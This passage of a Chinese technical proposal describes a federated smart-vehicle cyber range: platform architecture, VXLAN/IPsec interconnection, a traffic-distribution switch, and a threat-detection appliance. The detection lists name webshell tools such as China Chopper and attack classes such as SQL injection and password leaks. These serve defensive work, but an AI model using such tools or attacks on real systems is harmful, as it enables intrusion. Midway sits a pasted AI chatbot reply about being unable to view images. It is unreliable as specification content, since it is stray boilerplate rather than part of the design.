时，也保证了技术的先进、可持续以及系统化。</p><p>分布式态势分析功能架构如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6fd6742ae727bfbdc9bdd7377358217f.png"></p><ul><li>微服务架构：基于SpringCloudAlibaba2.x，该框架实现了微服务的核心功能，包括服务注册与发现、配置管理、负载均衡、熔断限流等。它能够将多个主靶场和分靶场作为独立的微服务进行管理，实现系统的高可用和弹性伸缩。</li><li>数据存储：采用MongoDB作为数据存储引擎，支持非结构化或半结构化数据的存储和查询。该框架提供了适配MongoDB的数据访问层，使得靶场之间可以方便地存储和共享数据，满足互联场景下的数据管理需求。采用统一的大数据平台进行全局数据管理，确保数据的一致性存储，并支持高效的统一计算。</li><li>安全认证和授权：框架通过深度定制SpringSecurity，实现了基于RBAC、JWT和OAuth2的无状态统一权限认证解决方案。它提供了统一的身份验证和权限控制机制，确保靶场之间的安全通信和数据保护。</li><li>弹性伸缩和负载均衡：框架支持水平扩展，可以根据需求动态增加或减少靶场的实例数量。利用SpringCloudAlibaba的负载均衡功能，框架能够自动将请求分发到不同的靶场实例，实现负载均衡和高可用性。</li><li>多环境部署和配置管理：该框架支持CI/CD多环境部署，可以方便地进行开发、测试和生产环境的切换。同时，它提供了配置管理功能，可根据不同环境的需求进行配置的灵活管理。</li><li>组件化设计和代码规范：框架采用组件化的思想，实现高内聚、低耦合和高核心功能</li></ul><p>系统平台支持向联邦靶场态势系统发送演练提交结果信息，支持接收联邦靶场态势系统的跨靶场结果验证信息。支持将本网络仿真平台态势分析采集数据、检测数据等发送到态势分析任务规定的主靶场或其它分靶场态势分析系统进行态势分析。同时支持手动同步更新分靶场和主靶场数据。</p><p>试验选择相关设备分别下发资产探测、漏洞探测、流量采集后，采集到的资产漏洞数据、流量数据等任务数据，以及检测到的攻击数据将上报到绿方系统，上报支持Kafka、Syslog等方式。</p><p>此外，试验前，可对分靶场下发攻击子图注册任务，子图包括基础攻击子图和复杂攻击子图。从分靶场接收的安全事件数据经过融合得到不同类型的基础攻击子图，基础攻击子图将基于时空关系经由关联分析模块进一步组合得到复杂攻击子图。根据攻击数据与攻击子图进行匹配，将进一步得到有效基础攻击和有效复杂攻击。</p><p>知识和数据同步共享靶场管理，可添加、修改、删除共享靶场信息，其中涵盖了共享方式、靶场共享地址以及靶场名称等。分靶场具备主动将自身所获知识主动共享到主靶场的能力，以促进整体知识体系的丰富和完善。这种双向的主动知识交流有助于构建更为协同、高效的安全防御体系，在知识融合过程中，系统将已有知识与共享知识进行综合整合。这一融合过程采用多种方式，其中包括去重处理，通过消除重复信息，确保知识的一致性和准确性。同时，还采用补全策略，填充缺失部分，以使知识更加完整和全面。这种融合方式能够提高知识库的质量，为后续安全分析提供更为可靠的基础，可以对共享记录进行管理，包括共享数据类型、共享时间、共享知识条数等。分靶场上报给主靶场数据传输方式包括API、Kafka、Syslog。</p><p>主靶场接收分靶场的共享知识，这有助于构建全面而深入的安全知识图谱，提升整体网络安全防护水平。其中涵盖了复杂攻击知识、基础攻击、漏洞、弱点、汽车资产。全局数据支持根据试验或分靶场分类查看。数据传输过程中支持加密安全传输。主靶场将经过分析的攻击数据发送至分靶场，同时接收分靶场的安全事件数据，然后根据攻击类型知识体系进行融合以及标准化解析，以及接收分靶场的汽车攻击分析数据，并与对应试验关联后将数据展示到可视化界面。</p><p>系统展示所有与主靶场互联的分靶场信息，包括分靶场名称、IP地址、地理位置、在线状态等，点击详情可查看分靶场的详细信息。系统还对主靶场下发到分靶场的试验进行汇总展示，包括试验名称、创建时间、试验进度、试验任务（资产探测、漏洞探测、流量采集、注册攻击子图）等，支持根据试验名称模糊查询，根据试验进度或创建时间精确查询。点击单个试验的资产探测/漏洞探测/流量采集查看任务详情，包括任务信息和任务对应的采集数据。攻击检测的关联分析每个试验可下发注册攻击子图任务，包括汽车基础攻击子图和复杂攻击子图。</p><p>所有分靶场的安全事件、基础攻击、复杂攻击、有效基础攻击和有效复杂攻击都将通过加密传输到主靶场进行全局攻击分析。管理数据同步记录，这些记录对于追踪数据同步过程和了解同步的内容至关重要，包括同步时间以及同步数据类型等。</p><h2 id="联邦互联模块"><a href="#联邦互联模块" class="headerlink" title="联邦互联模块"></a>联邦互联模块</h2><ul><li>支持BGP EVPN方式动态建立VXLAN隧道；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b809a28bd48d2c398ca02834200da3bd.png"></p><p>evpn隧道</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7076afa337019014b2dd5df0c04d8192.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/3812633b953ddfe435dc6be2de9d0e46.png"></p><p>evpn路由通告</p><p>BGP EVPN是一种使用BGP协议来传播EVPN信息的技术。EVPN提供了一种控制平面机制，用于管理VXLAN隧道和多点桥接。它允许不同网络设备（如交换机和路由器）之间共享关于网络拓扑和虚拟网络的信息。如上图，我司提供的联邦靶场支持BGP EVPN方式动态建立VXLAN隧道。</p><h3 id="方案设计-15"><a href="#方案设计-15" class="headerlink" title="方案设计"></a>方案设计</h3><p>功能参数设计为，系统支持BGP EVPN方式动态建立VXLAN隧道。双向身份认证功能，基于PKI证书进行身份认证。安全隧道传输，提供流量加密传输，保护数据完整性和真实性。基于源IP、目的IP等包过滤，提供黑白名单访问控制。接收其他联邦互联模块消息，采用消息中间件异步处理。互联路由虚拟化部署，路由支持SRv6功能，支持ospfv3 over srv6等。广域网加速功能，支持TFO、DRE、LZ算法。</p><p>性能参数设计为，处理转发（IPSec+Vxlan）时延≤70毫秒。</p><h4 id="项目背景-5"><a href="#项目背景-5" class="headerlink" title="项目背景"></a>项目背景</h4><p>在分布式靶场环境中，靶场之间的网络互联是确保各项试验能够顺利进行的基础。为了模拟真实的网络环境并进行有效的网络安全演练，需要构建一个安全、灵活且高效的网络互联框架。本方案旨在实现靶场之间的动态网络连接，提供安全可靠的数据传输，并支持高效的流量过滤和路由虚拟化。</p><h4 id="功能-8"><a href="#功能-8" class="headerlink" title="功能"></a>功能</h4><p>网络互联与动态隧道</p><p>BGP EVPN与VXLAN：支持通过BGP EVPN动态建立VXLAN隧道，实现跨越不同网络的靶场互联。</p><p>安全身份认证</p><p>双向身份认证：基于PKI证书进行身份认证，确保互联的靶场之间身份的真实性和安全性。</p><p>安全隧道传输</p><p>流量加密传输：提供加密传输，对数据包逐包进行认证，确保数据的完整性和真实性。</p><p>流量过滤与访问控制</p><p>包过滤：根据源IP、目的IP、源端口、目的端口、协议类型、时间段等进行流量过滤，实施黑白名单访问控制。</p><p>消息分发处理</p><p>消息分发：接收其他联邦互联模块的消息，并通过消息中间件异步处理，分发至不同的系统模块。</p><p>路由虚拟化与广域网加速</p><p>路由虚拟化：支持SRv6功能，并支持多种基于SRv6的路由协议和VPN。</p><p>广域网加速：提供TFO、DRE、LZ等算法支持的广域网加速功能。</p><h4 id="性能-7"><a href="#性能-7" class="headerlink" title="性能"></a>性能</h4><p>处理转发（IPSec+Vxlan）时延≤70毫秒。</p><p>系统架构</p><p>网络互联模块</p><p>实现BGP EVPN与VXLAN的动态隧道建立。</p><p>提供跨靶场之间的网络互联功能。</p><p>安全模块</p><p>实现双向身份认证和加密传输。</p><p>保护数据传输的安全性和私密性。</p><p>流量管理模块</p><p>提供包过滤和访问控制功能。</p><p>实现基于规则的流量控制。</p><p>消息处理模块</p><p>采用消息中间件进行消息的异步处理和分发。</p><p>路由虚拟化模块</p><p>支持SRv6功能和多种基于SRv6的网络协议。</p><p>实现路由的虚拟化部署。</p><p>广域网加速模块</p><p>提供TFO、DRE、LZ等算法支持的广域网加速功能。</p><h4 id="技术实施-3"><a href="#技术实施-3" class="headerlink" title="技术实施"></a>技术实施</h4><p>可靠性：确保网络连接的稳定性和数据传输的安全性。</p><p>灵活性：支持动态的网络拓扑变化和多种网络协议。</p><p>性能：满足低延迟的数据转发需求。</p><p>可扩展性：系统设计支持靶场数量和网络规模的增长。</p><p>本方案提供了一个高效、安全、可靠的分布式靶场网络互联解决方案。通过使用BGP EVPN和VXLAN技术，保证了靶场之间的动态互联和数据传输的安全性。同时，系统支持广域网加速和路由虚拟化，以适应不同的网络环境和性能需求。通过实施本方案，可以大大提升分布式靶场网络的互联能力和安全性，为网络安全演练提供坚实的基础设施支持。</p><h3 id="方案简介-20"><a href="#方案简介-20" class="headerlink" title="方案简介"></a>方案简介</h3><p>分布式互联：该框架引入了分布式互联模块，通过集成Zookeeper作为服务注册与发现中心，实现多个靶场之间的互联和通信。靶场之间可以动态注册和发现服务，实现跨靶场的服务调用和数据交互。</p><p>安全认证和授权：框架通过深度定制Spring Security，实现了基于RBAC、JWT和OAuth2的无状态统一权限认证解决方案。它提供了统一的身份验证和权限控制机制，确保靶场之间的安全通信和数据保护。</p><p>弹性伸缩和负载均衡：框架支持水平扩展，可以根据需求动态增加或减少靶场的实例数量。利用Spring Cloud Alibaba的负载均衡功能，框架能够自动将请求分发到不同的靶场实例，实现负载均衡和高可用性。</p><p>多环境部署和配置管理：该框架支持CI/CD多环境部署，可以方便地进行开发、测试和生产环境的切换。同时，它提供了配置管理功能，可根据不同环境的需求进行配置的灵活管理。</p><p>数据转发：支持IPSec、VxLan、BGP-EVPN、SRv6等多种方式互联互通。</p><p>组件化设计和代码规范：框架采用组件化的思想，实现高内聚、低耦合和高核心功能。</p><p>支持通过VXLAN方式与其它分靶场进行连接，并实现目标网络之间二层透明互联，界面如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/acebf84e0d28b7ff8a1bd5801fa587a9.png"></p><p>VxLAN互联</p><p>支持通过IPsecVPN或SSLVPN与其它分靶场或异地仿真网络进行互联互通，实现目标网络之间三层互联，界面如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8f526fd1f71bca03e11e271250dd96d7.png"></p><p>VPN互联</p><p>作为一个文本接口，我无法直接查看或显示图像。但是我可以跟你一起讨论理想的分靶场系统界面应该包含哪些功能，以及如何支持联邦靶场的目标网络调度要求和与其他分靶场网络的互联互通。</p><p>一个分靶场系统通常需要具备的关键界面和功能包括：</p><p>1. 场景目标网络生成:</p><p>功能参数如下：应有工具或模板快速创建或配置新的目标网络细节，包括网络设备、拓扑结构和安全设置。</p><p>功能参数如下：用户界面应提供拖拽式设计，便于非技术用户生成复杂网络场景。</p><p>2. 联邦靶场调度和管理:</p><p>功能参数如下：界面应该支持接入联邦靶场管理系统，允许用户请求和接收靶场网络调度任务。</p><p>功能参数如下：应有中心控制台集成所有分靶场活动，允许用户监控和协调各个靶场任务。</p><p>3. 互联互通设置:</p><p>功能参数如下：系统应提供网络路由配置工具，确保分靶场网络之间可以根据要求配置正确的联网路径和规则。</p><p>功能参数如下：应有检查工具验证网络连通性，并解决潜在的配置冲突。</p><p>4. 安全和隔离:</p><p>功能参数如下：界面应该支持配置靶场网络间的安全界限，例如通过隔离或虚拟专用网络(VPN)技术实现。</p><p>功能参数如下：对于联邦操作，应有清晰的安全协议设置和加密通信选项。</p><p>5. 用户权限和控制:</p><p>功能参数如下：系统应允许分配不同级别的用户权限，确保只有授权人员能够发起或变更靶场网络调度。</p><p>功能参数如下：界面中应包含用户操作的详细日志，方便审计和追溯。</p><p>6. 实时监控和响应:</p><p>功能参数如下：应有实时数据看板显示各分靶场当前状态，包括活跃连接、流量、攻击检测等。</p><p>功能参数如下：在遇到网络异常或安全事件时，应该有应急响应和通知机制。</p><p>请注意，这些功能的实现要根据实际操作环境的技术支持、网络安全政策和组织需求进行设计和调整。如果您可以提供更多的上下文或具体需求，我可以为您提供更加详细的资讯和建议。<img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8562f571a049e625cfdb664e46fd7eb0.png"></p><p>分靶场目标网络调度</p><h1 id="智能汽车网络靶场安全特征采集设备"><a href="#智能汽车网络靶场安全特征采集设备" class="headerlink" title="智能汽车网络靶场安全特征采集设备"></a>智能汽车网络靶场安全特征采集设备</h1><h2 id="总体概述-1"><a href="#总体概述-1" class="headerlink" title="总体概述"></a>总体概述</h2><p>靶场安全特征采集设备主要由以下几部分组成:</p><ul><li>采集数据流智能分发设备,用于复制和分发攻防流量。</li><li>全流量威胁发现设备,对流量进行全面检测和分析。</li><li>应用协议威胁检测设备,分析应用层协议并检出威胁。</li><li>多层协议异常检测设备,识别各层协议的异常行为。</li><li>漏洞特征采集设备,对目标网络资产进行漏洞探测。</li></ul><p>这些设备可以收集目标网络的资产漏洞数据,并在试验过程中实时检测攻防流量的各类威胁特征和异常行为。</p><p>检测结果以安全事件的形式发送到态势子系统,用以构建知识图谱和进行安全关联分析。</p><p>通过多维度的流量分析和漏洞探测,可以全面收集网络的安全视图,辅助测试人员更好地进行靶场试验和态势评估。</p><h2 id="靶场安全特征采集设备"><a href="#靶场安全特征采集设备" class="headerlink" title="靶场安全特征采集设备"></a>靶场安全特征采集设备</h2><p>靶场安全特征采集设备系统架构图如下所示</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d1d9b710599268ef43e424909234191e.png"></p><h3 id="采集数据流智能分发设备"><a href="#采集数据流智能分发设备" class="headerlink" title="采集数据流智能分发设备"></a>采集数据流智能分发设备</h3><p>功能参数如下：</p><ol><li><p>机架式盒式交换机，高度1U，管理专用端口2，console1，USB端口1。</p></li><li><p>配置24个千兆Base-T端口，4个万兆SFP+端口。</p></li><li><p>关键部件（CPU、转发芯片）采用国产产品。</p></li><li><p>支持基于端口的M:N流量复制功能，支持基于流的M:N流量复制功能。</p></li><li><p>支持普通IPv4、IPv6报文五元组流分类功能和内层（VXLAN）IPv4、IPv6报文五元组流分类功能。</p></li><li><p>支持基于Hash、轮询的报文分担功能。</p></li><li><p>支持报文截断、增加时间戳和以太网头部、增加源端口标识、修改报文头部、剥离隧道等功能。</p><p>性能参数如下：</p></li><li><p>吞吐能力1.92Tbps，转发能力1260Mpps。</p></li><li><p>配置2个交流电源，4个可插拔模块化风扇，24个万兆多模光模块。</p></li></ol><h4 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h4><p>功能参数设计为，机架式盒式交换机具备高度1U，拥有管理专用端口2个，console 1个，USB端口1个。配置24个千兆Base-T端口和4个万兆SFP+端口，采用国产关键部件（CPU、转发芯片）。支持端口和流基的M:N流量复制功能，IPv4/IPv6报文流分类功能，内层（VXLAN）报文流分类功能。提供基于Hash、轮询的报文分担功能，报文截断、增加时间戳、源端口标识、修改报文头部、剥离隧道等功能。</p><p>性能参数设计为，吞吐能力1.92Tbps，转发能力1260Mpps。配置2个交流电源，4个可插拔模块化风扇，24个万兆多模光模块。</p><p>设备选择：选择高度为1U的机架式盒式交换机，具备所需的管理专用端口、console端口和USB端口，其中包含两个管理专用端口。设备配置有24个千兆Base-T端口和4个万兆SFP+端口。设备关键部件采用国产化，包括CPU和转发芯片。以支持国产产业发展，提高系统的可靠性和安全性</p><p>功能支持：采集数据流智能分发设备支持内层（VXLAN）IPv4报文功能、支持剥离隧道功能、修改报文头部功能、支持普通IPv4、IPv6报文五元组流分类功能、增加源端口标识、IPv6报文五元组流分类功能、支持报文截断、基于端口和基于流的M:N流量复制功能、增加时间戳和以太网头部功能以及基于Hash和轮询的报文分担功能等功能。</p><p>性能支持：采集数据流智能分发设备的数据流处理速度1.92Tbps。设备的数据包转发速率1260Mpps。设备具备快速的数据包转发能力，能够支持高并发的网络流量传输</p><p>电源和风扇：采集数据流智能分发设备配置2个交流电源，以确保系统的可靠性和冗余性。拥有4个可插拔模块化风扇，以保证设备的散热性。</p><p>光模块：采集数据流智能分发设备配置24个万兆多模光模块，以满足连接需求。</p><h3 id="靶场定制全流量威胁检测"><a href="#靶场定制全流量威胁检测" class="headerlink" title="靶场定制全流量威胁检测"></a>靶场定制全流量威胁检测</h3><ul><li>支持基于工具特征的WEBSHELL检测，能通过系统调用、系统配置、文件的操作来及时发现威胁如：中国菜刀、小马上传工具、小马生成器等（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/050f182aff97588cbe0135d560a05166.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/23f23f493334aae278bf388ec9addfb3.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7c775f702b08bac8cc9e7fe5550e9e5e.png"></p><ul><li>支持告警的深度行为分析，行为包括DNS解析行为、TCP/UDP交互行为、WEB访问行为、传输文件行为（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/20f3cc5d6be5dce311ccdf9c1fd33b62.png"></p><ul><li>支持以受害资产维度进行分析，分析内容包括失陷状态、受到的攻击类型、威胁级别、处于的攻击阶段、所属的资产分组（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/e5c98d4badd8e1c39004c9bf595cac28.png"></p><ul><li>支持应用系统安全检测，应用安全的细分维度包括：WEB安全、数据库安全、中间件安全、邮件安全（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/499270f45e3d15382f8478c39d57f53f.png"></p><ul><li>系统安全的细分维度包括：暴力破解、弱口令、未授权访问、挖矿行为（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/33034a296b82d11e58c0deca3d709a1b.png"></p><ul><li>支持异常登录行为检测，检测内容包括：源ip、账号、登录资产IP、使用协议、登录结果等信息，且能进行异常时间配置（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/de3b154826e702cb6200764d91dc9a13.png"></p><ul><li>支持明文密码泄露行为检测，检测内容包含：登录账号IP、账号、密码、使用协议（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/fcf55d1d86630b29d48f2fc49c6397dc.png"></p><ul><li>支持对mysql、mssql、oracle、sybase等常见数据库高危操作行为分析，其能自定义规则（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1d1a5346bf5f73fdf5493a63d07946d0.png"></p><ul><li>支持可疑来源访问行为分析，能展示来源、源IP、资产IP、资产组、源地域、目的端口、URI等信息，且能自定义可疑来源（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4c556cae71b2529658b842e537c0241a.png"></p><ul><li>支持配置展示云端众测平台漏洞情报及资产漏洞信息（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ebd1f4d9253c1564951e22bcc29023b3.png" alt="表格 描述已自动生成"></p><ul><li>支持大屏展示整体资产风险态势，包含资产矩形树结构、资产分类、资产概况、开放服务统计、资产风险状态（请提供截图证明）</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6472dc85c1dbedcc909a9bb1b63a329a.png"></p><h4 id="方案设计-16"><a href="#方案设计-16" class="headerlink" title="方案设计"></a>方案设计</h4><p>功能参数设计为，流量采集性能为1Gb。配置有2个GE流量监听电口、2个10GE流量监听光口、2个GE管理电口、1个DB9 Console接口，20TB SATA存储硬盘。支持常见协议识别与还原，包括http、dns等。对流量中文件传输行为进行发现和还原，并记录文件MD5。</p><p>支持常见数据库协议识别与还原。记录TCP/UDP会话、异常流量会话、web访问等行为描述。支持自定义协议和端口，流量实时IOC匹配功能。检测WEB应用攻击，包括SQL注入、XSS等。支持其他WEB攻击检测。流量实时IOC匹配功能，总情报量370+万条。支持基于工具特征的WEBSHELL检测。多种攻击检测。支持文件还原，抓包分析。支持语义分析检测。自定义弱口令字典。旁路HTTPS解密、威胁检测。AES256、SM4数据传输加密。</p><p>支持威胁告警信息发送。云端威胁情报中心联动。告警深度行为分析。支持以受害资产维度和攻击者维度进行分析。应用系统安全检测。系统安全细分维度。支持DNS解析、疑似DNS服务器发现、DNS重绑定分析。异常登录行为检测。明文密码泄露行为检测。常见数据库高危操作行为分析。可疑来源访问行为分析。</p><p>展示云端众测平台漏洞情报及资产漏洞信息。大屏展示整体资产风险态势。</p><h5 id="项目背景-6"><a href="#项目背景-6" class="headerlink" title="项目背景"></a>项目背景</h5><p>随着智能汽车技术的发展，车载网络安全成为车辆信息系统中不可忽视的一环。为了保障智能汽车系统的安全性，需要对车载网络进行实时的监控和分析，以便能够及时发现并响应安全事件。本系统旨在提供一套完整的解决方案，用于智能汽车网络的安全事件检测、流量分析和威胁情报处理。</p><h5 id="功能-9"><a href="#功能-9" class="headerlink" title="功能"></a>功能</h5><p>流量采集与监听</p><p>流量采集性能：1Gb，包含多种流量监听接口和存储能力。</p><p>协议识别与还原</p><p>协议识别：支持常见协议的识别与网络流量还原，用于取证分析和威胁发现。</p><p>文件传输行为分析</p><p>文件传输检测：支持对流量中的文件传输行为进行发现、还原，并记录文件MD5。</p><p>数据库协议识别</p><p>数据库协议识别：支持常见数据库协议的识别和还原。</p><p>行为记录</p><p>行为描述记录：支持记录TCP/UDP会话、异常流量、Web访问等多种行为。</p><p>自定义协议与IOC匹配</p><p>自定义协议：支持自定义协议和端口配置，以及实时IOC匹配功能。</p><p>WEB应用攻击检测</p><p>WEB攻击检测：支持检测SQL注入、XSS、CSRF等WEB应用攻击。</p><p>文件还原</p><p>协议流量文件还原：支持对多种协议的流量进行文件还原。</p><p>抓包分析</p><p>抓包分析：支持对流量进行抓包分析，可自定义抓包参数。</p><p>语义分析检测</p><p>语义分析：支持基于网络请求的语义分析检测。</p><p>弱口令检测</p><p>弱口令字典：支持自定义弱口令字典和相关协议的弱口令检测。</p><p>HTTPS解密与威胁检测</p><p>HTTPS解密：支持旁路HTTPS解密和威胁检测。</p><p>数据传输加密</p><p>数据传输加密：支持AES256、SM4等加密算法保障数据安全。</p><p>威胁情报与联动</p><p>云端威胁情报：支持与云端威胁情报中心联动。</p><p>行为分析</p><p>深度行为分析：支持DNS解析、TCP/UDP交互、WEB访问等行为分析。</p><p>分析维度</p><p>受害资产分析：支持以受害资产和攻击者维度进行分析。</p><p>安全检测</p><p>应用系统安全检测：支持WEB、数据库、中间件、邮件等安全检测。</p><p>DNS分析</p><p>DNS解析检测：支持可疑DNS解析和DNS服务器发现分析。</p><p>登录与密码泄露检测</p><p>异常登录检测：支持检测明文密码泄露和异常登录行为。</p><p>数据库高危操作分析</p><p>数据库操作分析：支持对常见数据库高危操作的行为分析。</p><p>可疑来源分析</p><p>可疑来源分析：支持可疑来源访问行为的分析。</p><p>漏洞信息与态势展示</p><p>漏洞信息展示：支持配置展示云端众测平台漏洞情报及资产漏洞信息。</p><p>资产风险态势：支持大屏展示整体资产风险态势。</p><h5 id="系统架构-5"><a href="#系统架构-5" class="headerlink" title="系统架构"></a>系统架构</h5><p>流量采集模块</p><p>负责从网络中采集流量，并进行初步的分类和存储。</p><p>协议分析模块</p><p>对采集到的流量进行深度协议分析，实现数据还原和行为记录。</p><p>威胁检测模块</p><p>根据已知的攻击模式和IOC，对流量进行分析，识别潜在的威胁。</p><p>行为分析模块</p><p>对网络行为进行深度分析，包括DNS解析、文件传输、登录行为等。</p><p>加密与解密模块</p><p>对流量进行加密传输，并在需要时进行解密处理。</p><p>威胁情报管理模块</p><p>与云端威胁情报中心联动，管理和应用威胁情报。</p><p>可视化与报告模块</p><p>提供用户界面，展示威胁检测结果和网络安全态势。</p><p>数据管理与同步模块</p><p>管理采集到的数据，支持与其他系统的数据同步。</p><h5 id="技术实施-4"><a href="#技术实施-4" class="headerlink" title="技术实施"></a>技术实施</h5><p>高性能处理：系统应能处理高速网络流量并保持低延迟。</p><p>准确性：协议识别和威胁检测需要高准确率。</p><p>易用性：系统应提供直观的用户界面和报告。</p><p>可扩展性：系统支持新增的威胁情报和自定义规则。</p><p>本方案提供了一个全面的智能汽车网络安全事件检测与流量分析解决方案，涵盖了从流量采集到威胁分析的完整流程。通过实施本方案，能够有效提升智能汽车网络的安全防护能力，及时发现并响应安全威胁，保障车载网络环境的安全稳定。</p><h4 id="方案简介-21"><a href="#方案简介-21" class="headerlink" title="方案简介"></a>方案简介</h4><p>设备选择：靶场定制全流量威胁检测设备是一台高性能的流量采集设备，其流量采集性能不低于1Gb。设备配置有1个DB9 Console接口、2个10千兆以太网流量监听光口、2个千兆以太网流量监听电口、2个千兆以太网管理电口。此外，设备还搭载了20TB SATA存储硬盘，并且支持扩容，以满足对大容量数据存储的需求。</p><p>功能支持：靶场定制全流量威胁检测设备支持对常见协议的识别与还原，包括但不限于FTP协议、SNMP协议、Telnet协议、NFS协议、ICMP协议、SSL协议、SSH协议、HTTP协议、DNS协议、SMTP协议、POP3协议、IMAP协议、Webmail协议、DB2协议、Oracle协议、MySQL协议、SQL Server协议、Sybase协议以及SMB协议等。可以通过对流量进行解析，能够还原出协议的具体内容，方便后续的取证分析和威胁发现。</p><p>文件传输行为进行发现和还原：记录文件的MD5值，以便后续的分析和对比。支持的文件类型应包括可执行文件包括但不限于EXE文件、DLL文件、OCX文件、SYS文件、COM文件、APK文件、BIN文件等、压缩格式文件包括但不限于RAR文件、ZIP文件、GZ文件、7Z文件、TAR文件等、文档类型文件包括但不限于Word文件、Excel文件、PDF文件、RTF文件、PPT文件、TXT文件等、多媒体文件包括但不限于Flash文件、JPG文件、JPEG文件、PNG文件、FLV文件、SWF文件等、脚本文件包括但不限于HTML文件、HTM文件、Java文件、MHTML文件、MHT文件等。</p><p>数据库协议解析：支持常见数据库协议包括但不限于DB2数据库协议、Oracle数据库协议、SQL Server数据库协议、MySQL数据库协议、PostgreSQL数据库协议的识别或还原。通过解析数据库协议的流量，能够还原出具体的数据库操作，方便进行数据库安全分析和威胁检测。</p><p>流量威胁检测：并提供详细的行为描述。支持的检测内容包括IM通信、Telnet行为、FTP控制通道、异常流量会话记录、SSL加密协商、Web访问记录、登录情况、TCP/UDP会话记录、邮件行为、域名解析、SQL访问记录以及文件传输等。通过对流量中的行为进行描述，能够帮助使用者更好地理解和分析威胁事件。</p><p>自定义功能：靶场定制全流量威胁检测设备支持自定义协议和端口，以满足特殊场景下的流量抓取需求。这使的设备可以适应不同网络环境和应用场景的需求，提高系统的灵活性和适应性。此外，还拥有基于流量的实时IOC匹配功能，情报总量不低于50万条，且包含具备主流的IOC。通过实时匹配IOC，能够及时发现已知的威胁，提高威胁检测的准确性和及时性。</p><p>攻击检测与分析功能：靶场定制全流量威胁检测设备支持检测针对WEB应用的攻击，涵盖了跨站请求伪造CSRF攻击、注入型攻击如系统配置注入、XSS注入、SQL注入攻击检测。通过对流量中的攻击行为进行检测和分析，能够及时发现并阻止潜在的攻击行为。</p><p>靶场定制全流量威胁检测设备支持检测如文件写入、文件包含、信息泄露、权限绕过、弱口令、目录遍历攻击等。能够全面覆盖各种WEB攻击场景，提高系统的安全性和防护能力。还可以进行其他攻击检测，例如代码执行、黑市攻击、协议异常、网络欺骗等。</p><p>能够根据文件相关的操作、修改系统配置、进行系统调用等方式及时发现威胁，如小马生成器、小马上传工具、中国菜刀等。可以及时发现并阻止恶意工具的使用，保护系统的安全。并且支持基于代理程序的攻击检测，如HTTP代理程序、TCP代理程序等。通过对代理程序的行为进行分析，能够发现并阻止代理程序的恶意行为。以下是基于基于工具特征的WEBSHELL检测截图证明：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/050f182aff97588cbe0135d560a05166.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/23f23f493334aae278bf388ec9addfb3.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 